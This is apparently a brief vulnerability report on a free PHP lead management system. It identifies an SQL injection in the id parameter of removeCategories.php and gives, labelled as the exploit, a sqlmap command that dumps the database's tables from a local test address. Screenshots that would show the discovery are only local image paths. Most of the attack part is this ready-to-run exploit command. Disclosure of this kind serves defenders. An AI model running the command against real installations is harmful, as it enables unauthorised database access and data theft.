vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image-20221219163051961](C:\markdown\images\image-20221219163051961.png)

EXP:

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeCategories.php?id=1" --dbms=mysql -D penglead --tables
```

![image-20221219163205017](C:\markdown\images\image-20221219163205017.png)